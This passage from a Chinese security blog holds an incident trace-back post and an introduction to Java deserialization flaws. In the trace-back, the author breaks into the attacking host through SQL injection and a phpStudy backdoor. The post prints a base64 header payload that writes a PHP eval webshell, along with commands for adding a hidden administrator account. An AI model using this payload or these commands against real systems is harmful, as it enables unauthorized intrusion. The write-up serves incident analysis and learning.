src="/2022/10/11/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%99%AE%E9%80%9A%E7%9A%84%E6%94%BB%E5%87%BB%E6%BA%AF%E6%BA%90%E6%8E%92%E6%9F%A5/fz-1.jpg" title="登录"><br>存在用户，但没啥关系，存在sql注入，查看了库，只有test库（&#x2F;不对劲，交互连接的库名不是这个），但不能查询内容。<br><img src="/2022/10/11/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%99%AE%E9%80%9A%E7%9A%84%E6%94%BB%E5%87%BB%E6%BA%AF%E6%BA%90%E6%8E%92%E6%9F%A5/fz-2.png" title="sql注入"><br>–os-shell一把嗦。<br><img src="/2022/10/11/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%99%AE%E9%80%9A%E7%9A%84%E6%94%BB%E5%87%BB%E6%BA%AF%E6%BA%90%E6%8E%92%E6%9F%A5/fz-3.jpg" title="sql注入"><br>权限不够，权限不足，–file-read啥的也是没权限直接过。<br>于此同时目录也早扫完了，查看了一下，看到早就已经被挂了马了，肉鸡没跑了。<br><img src="/2022/10/11/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%99%AE%E9%80%9A%E7%9A%84%E6%94%BB%E5%87%BB%E6%BA%AF%E6%BA%90%E6%8E%92%E6%9F%A5/fz-4.png" title="目录扫描"><br>查看了下漏扫结果，存在phpstudy后门，才反应过来本来就是肉鸡，一个劲对外扫phpstudy后门，黑页的游戏也是phpstudy部署的，本身就有后门<br><img src="/2022/10/11/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%99%AE%E9%80%9A%E7%9A%84%E6%94%BB%E5%87%BB%E6%BA%AF%E6%BA%90%E6%8E%92%E6%9F%A5/fz-5.png" title="漏洞扫描"><br>顺其自然通过Phpstudy后门写文件获取shell<br><img src="/2022/10/11/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%99%AE%E9%80%9A%E7%9A%84%E6%94%BB%E5%87%BB%E6%BA%AF%E6%BA%90%E6%8E%92%E6%9F%A5/fz-6.png" title="payload"><br>手工直接请求头添加下面payload即可，同时删除原本的Accept-Encoding改成下面的，&#x2F;&#x2F;开始忘删了导致没生效，蠢死。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Accept-Encoding: gzip,deflate</span><br><span class="line">Accept-Charset: c3lzdGVtKCdlY2hvIF48P3BocCBAZXZhbCgkX1BPU1RbInVwZGF0ZSJdKT9ePj5DOlxMVF9TZXJ2ZXJccGhwU3R1ZHlcV1dXXHVwZGF0ZTF0ZXN0LnBocCcpOw==</span><br></pre></td></tr></table></figure><p><img src="/2022/10/11/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%99%AE%E9%80%9A%E7%9A%84%E6%94%BB%E5%87%BB%E6%BA%AF%E6%BA%90%E6%8E%92%E6%9F%A5/fz-7.png" title="发送payload"> </p><h3 id="攻击源IP服务器分析："><a href="#攻击源IP服务器分析：" class="headerlink" title="攻击源IP服务器分析："></a>攻击源IP服务器分析：</h3><p>其中查看数据发现系统存在可见内最早的webshell为2019-10-15日,文件名为test.php(不确定是否为文件真正上传建立的日期)<br><img src="/2022/10/11/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%99%AE%E9%80%9A%E7%9A%84%E6%94%BB%E5%87%BB%E6%BA%AF%E6%BA%90%E6%8E%92%E6%9F%A5/sy-1.png" title="webshell"><br>以及2022-10-10 01:28创建的webshell，文件名称为phpshell.php，同时期上传的cs马<br><img src="/2022/10/11/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%99%AE%E9%80%9A%E7%9A%84%E6%94%BB%E5%87%BB%E6%BA%AF%E6%BA%90%E6%8E%92%E6%9F%A5/sy-2.png" title="webshell"><br>但该攻击者未进行其他的相关操作，仅获取服务器权限后看了一下，未发现其他操作。<br>于此同时，发现被添加的影子账户loxxxxo$,并且在这个影子账户的桌面上传了phpstudy的批量扫描后门利用工具，以及一些扫描记录和扫描的目标网段<br><img src="/2022/10/11/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%99%AE%E9%80%9A%E7%9A%84%E6%94%BB%E5%87%BB%E6%BA%AF%E6%BA%90%E6%8E%92%E6%9F%A5/sy-3.png" title="记录"><br><img src="/2022/10/11/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%99%AE%E9%80%9A%E7%9A%84%E6%94%BB%E5%87%BB%E6%BA%AF%E6%BA%90%E6%8E%92%E6%9F%A5/sy-4.png" title="记录"><br>通过创建影子账户登录服务器，本身就开了3389，就不用再开启端口了<br><img src="/2022/10/11/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%99%AE%E9%80%9A%E7%9A%84%E6%94%BB%E5%87%BB%E6%BA%AF%E6%BA%90%E6%8E%92%E6%9F%A5/sy-5.png" title="创建账户"> </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net user xxx /add  //添加管理员账户</span><br><span class="line">net localgroup administrators xxx /add  //将添加的管理员账户加入管理员组</span><br></pre></td></tr></table></figure><p>利用工具的一些扫描记录<br><img src="/2022/10/11/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%99%AE%E9%80%9A%E7%9A%84%E6%94%BB%E5%87%BB%E6%BA%AF%E6%BA%90%E6%8E%92%E6%9F%A5/sy-6.png" title="利用工具"><br>同时该影子用户还上传了一些黑灰产软件，运行挂起获取收益<br><img src="/2022/10/11/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%99%AE%E9%80%9A%E7%9A%84%E6%94%BB%E5%87%BB%E6%BA%AF%E6%BA%90%E6%8E%92%E6%9F%A5/yz-1.png" title="挂起收益"><br>一个月内获得的积分收益<br><img src="/2022/10/11/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%99%AE%E9%80%9A%E7%9A%84%E6%94%BB%E5%87%BB%E6%BA%AF%E6%BA%90%E6%8E%92%E6%9F%A5/yz-2.png" title="挂起收益"> </p><h3 id="攻击源IP-loxxxxo影子用户分析："><a href="#攻击源IP-loxxxxo影子用户分析：" class="headerlink" title="攻击源IP loxxxxo影子用户分析："></a>攻击源IP loxxxxo影子用户分析：</h3><p>通过查看服务器端口连接情况发现与该服务器3389远程连接有一个IP 175.xxx.xxx.138（上海 腾讯云），极大可能也为肉鸡。<br><img src="/2022/10/11/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%99%AE%E9%80%9A%E7%9A%84%E6%94%BB%E5%87%BB%E6%BA%AF%E6%BA%90%E6%8E%92%E6%9F%A5/yz-3.png" title="连接情况"><br>同时查看当前服务器在线用户，该影子用户loxxxxo$处于连接在线状态，也就是说上述的175.xxx.xxx.138的腾讯云服务器即为该影子用户的远程连接主机。<br><img src="/2022/10/11/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%99%AE%E9%80%9A%E7%9A%84%E6%94%BB%E5%87%BB%E6%BA%AF%E6%BA%90%E6%8E%92%E6%9F%A5/yz-4.png" title="在线情况"><br>通过信息查看loxxxxo$用户创建时间为2022年9月20日（不排除为后续修改密码后的时间）（因此说明10号上传的webshell的攻击者与该用户不为同一人）。<br><img src="/2022/10/11/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%99%AE%E9%80%9A%E7%9A%84%E6%94%BB%E5%87%BB%E6%BA%AF%E6%BA%90%E6%8E%92%E6%9F%A5/yz-5.png" title="创建情况"> </p><p><strong>简述该用户信息：</strong><br>1、影子用户：loxxxxo$<br>2、远程连接主机：175.xxx.xxx.138（上海 腾讯云）<br>3、9月20日甚至跟早入侵该攻击源IP并作为跳板对外扫描Phpstudy后门，同时利用入侵主机部署黑灰产软件获益。<br>4、其中一个黑灰产软件使用的他的会员号：AG-xxx</p><h3 id="后续思路："><a href="#后续思路：" class="headerlink" title="后续思路："></a>后续思路：</h3><p>1、针对175.xxx.xxx.138攻击主机，简单看了一下，开了80端口 但没什么应用部署，也没查到相关威胁情报信息，极大可能也为跳板机。<br>2、针对黑灰产软件上的会员号信息，涉及到网站jingxxx.taxxx.com，意思得获取这个网站权限在查相关用户信息，工作量较大，仅思考了下。</p><h3 id="总结事件线："><a href="#总结事件线：" class="headerlink" title="总结事件线："></a>总结事件线：</h3><p>该源IP被很早入侵并使用phpstudy部署了几套web游戏系统——&gt;真实攻击者持有IP175.xx.xx.138通过phpstudy后门扫到该服务器存在后门，并通过后门获取服务器权限，同时创建了影子账户loxxxxo$——&gt;该用户上传黑灰产软件运行挂机收益，同时定期使用Phpstudy批量扫描工具对全网扫描——&gt;10月10日凌晨扫描至单位业务系统服务器触发告警。</p><h2 id="0x03、总结"><a href="#0x03、总结" class="headerlink" title="0x03、总结"></a>0x03、总结</h2><p>本次溯源并未实际溯源到真实用户，排查过程也很仓储，也没去找最开始的入侵痕迹，简单排查告警触发后的溯源分析过程，了解攻击者的入侵思路和入侵意图，再进一步的话可能从后续思路再入手，但可能短时间获取不到有用信息，就先这样记录下吧。</p>]]></content>
      
      
      <categories>
          
          <category> 实战记录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 实战记录 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java安全-初识反序列化</title>
      <link href="/2022/09/27/java%E5%AE%89%E5%85%A8-%E5%88%9D%E8%AF%86%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
      <url>/2022/09/27/java%E5%AE%89%E5%85%A8-%E5%88%9D%E8%AF%86%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00、前言"><a href="#0x00、前言" class="headerlink" title="0x00、前言"></a>0x00、前言</h2><p>学习java基础知识记录，方便查阅。</p><h2 id="0x01、反序列化是什么？有什么用？"><a href="#0x01、反序列化是什么？有什么用？" class="headerlink" title="0x01、反序列化是什么？有什么用？"></a>0x01、反序列化是什么？有什么用？</h2><blockquote><p>  Java 提供了一种对象序列化的机制，该机制中，一个对象可以被表示为一个字节序列，该字节序列包括该对象的数据、有关对象的类型的信息和存储在对象中数据的类型。将序列化对象写入文件之后，可以从文件中读取出来，并且对它进行反序列化，也就是说，对象的类型信息、对象的数据，还有对象中的数据类型可以用来在内存中新建对象。 </p></blockquote><p>java序列化会更有利于传输，它的速度会更快，并且也会更安全，被调用方序列化，调用方反序列化即能够得到传输之前的最原始的java对象，常常用来做不同进程之间的对象传输。能够更加便于储存，不论是存储成文件又或者是存储成数据库都是可以的，存储成文件，下次要用可以直接反序列拿到对象。</p><h2 id="0x02、反序列化如何实现"><a href="#0x02、反序列化如何实现" class="headerlink" title="0x02、反序列化如何实现"></a>0x02、反序列化如何实现</h2><p>实现方法：通过该对象所处类实现<font color=red>Serializable</font>接口，调用<font color=red>writeObject()</font>方法序列化、<font color=red>readObject()</font>方法反序列化分别对对象进行数据转换的写入和读取。</p><p><font color=red>writeObject()</font>序列化：将java对象转换成java字节序列、json、xml等数据格式的过程，利用ObjectOutputStream流接口把对象序列化数据写入文件。<br><font color=red>readObject()</font>反序列化：将java字节序列、json、xml等数据格式还原成java对象的过程，利用ObjectInputStream流接口把序列化文件读取并恢复成对象。</p><p>一个类的对象要想序列化成功，必须满足两个条件：<br>1、该类必须实现 java.io.Serializable 接口。<br>2、该类的所有属性必须是可序列化的。如果有一个属性不是可序列化的，则该属性必须注明是短暂的。<br>注：不可序列化的属性：带static修饰（静态变量）和transient修饰（临时变量）的属性，对于transient属性序列化机制会跳过而不会将其写入文件，但在读取时也不可恢复，该属性值保持默认初始化值。</p><h2 id="0x03、反序列化代码实现demo"><a href="#0x03、反序列化代码实现demo" class="headerlink" title="0x03、反序列化代码实现demo"></a>0x03、反序列化代码实现demo</h2><p>新建java项目，创建pack包，新建java程序，不赘述了。</p><h3 id="类对象："><a href="#类对象：" class="headerlink" title="类对象："></a>类对象：</h3><p>创建people类，并实现<font color=red>Serializable</font>接口<br><img src="/2022/09/27/java%E5%AE%89%E5%85%A8-%E5%88%9D%E8%AF%86%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/classpeople.png" title="people类"></p><h3 id="序列化："><a href="#序列化：" class="headerlink" title="序列化："></a>序列化：</h3><p>创建demo类，实现对people类对象调用并实例化输出<br><img src="/2022/09/27/java%E5%AE%89%E5%85%A8-%E5%88%9D%E8%AF%86%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/ser.png" title="序列化过程"><br>查看输出txt为序列化数据<br><img src="/2022/09/27/java%E5%AE%89%E5%85%A8-%E5%88%9D%E8%AF%86%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/sertxt.png" title="序列化结果"><br>生成的数据文件为16进制，乱码显示以  sr开头</p><blockquote><p>  java原生序列化的16进制是以aced00057372开头、base64编码是以rO0ABXNy开头</p></blockquote><h3 id="反序列化："><a href="#反序列化：" class="headerlink" title="反序列化："></a>反序列化：</h3><p>创建unser类，实现对序列化文件进行反序列化读取并输出。<br><img src="/2022/09/27/java%E5%AE%89%E5%85%A8-%E5%88%9D%E8%AF%86%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/unser.png" title="序列化结果"></p><p>以上过程为一个简单的序列化与反序列化的过程。</p><h2 id="0x04、安全成因"><a href="#0x04、安全成因" class="headerlink" title="0x04、安全成因"></a>0x04、安全成因</h2><p>与其说是漏洞成因，不妨说是安全成因，单从上述的反序列化过程似乎没发现怎么变成常谈的java反序列化漏洞，既然是反序列化漏洞，那重点就在反序列化上，即readObject()方法;<br>学习总结的漏洞成因要素：<br>1、readObject()方法被重写，当实现Servializable类并重写了readObject()方法，系统执行反序列化时会调用重写的readObject()方法。<br>2、重写的readObject()方法含有危险方法，如方法中直接执行Runtime.getRuntime().exec();<br>3、重写的readObject()方法中存在调用其它类的可控变量并执行危险函数。<br>4、套娃3步骤，调用其它类中变量再次调用另外一个类中的方法。#可以理解为常说的gadget链，通俗点说就是漏洞利用链。</p><h3 id="案例demo-1"><a href="#案例demo-1" class="headerlink" title="案例demo-1"></a>案例demo-1</h3><p><strong>重写readObject方法并直接执行危险函数</strong><br>实现Servializable类的实例类重写了readObject()方法，readObject()方法执行了危险函数。<br><img src="/2022/09/27/java%E5%AE%89%E5%85%A8-%E5%88%9D%E8%AF%86%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/anli-1.png" title="readObject方法重写"><br>这是执行反序列化步骤 发现危险函数被执行<br><img src="/2022/09/27/java%E5%AE%89%E5%85%A8-%E5%88%9D%E8%AF%86%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/anli-2.png" title="危险函数被执行"><br>通过调试可以认证这点<br>在调用readObject()方法处下断点<br><img src="/2022/09/27/java%E5%AE%89%E5%85%A8-%E5%88%9D%E8%AF%86%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/anli-3.png" title="调试"><br>可看到调用重写的readObject()方法<br><img src="/2022/09/27/java%E5%AE%89%E5%85%A8-%E5%88%9D%E8%AF%86%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/anli-3-1.png" title="调试"></p><h3 id="案例demo-2"><a href="#案例demo-2" class="headerlink" title="案例demo-2"></a>案例demo-2</h3><p><strong>重写readObject方法，方法中调用了其他类中的危险方法</strong><br>新建立一个exec类，其中exec类使用了危险函数。<br><img src="/2022/09/27/java%E5%AE%89%E5%85%A8-%E5%88%9D%E8%AF%86%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/anli-4-1.png" title="exec类"><br>重写readObject方法，方法中调用了exec类对象。<br><img src="/2022/09/27/java%E5%AE%89%E5%85%A8-%E5%88%9D%E8%AF%86%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/anli-4-2.png" title="readObject方法重写"><br>同样运行反序列化操作，同样实现了反序列化漏洞，执行了命令<br><img src="/2022/09/27/java%E5%AE%89%E5%85%A8-%E5%88%9D%E8%AF%86%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/anli-4-3.png" title="readObject方法重写"></p><p>上诉案例仅提供漏洞造成原理思路，实际漏洞调用链远比其复杂。</p>]]></content>
      
      
      <categories>
          
          <category> Java安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java安全 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
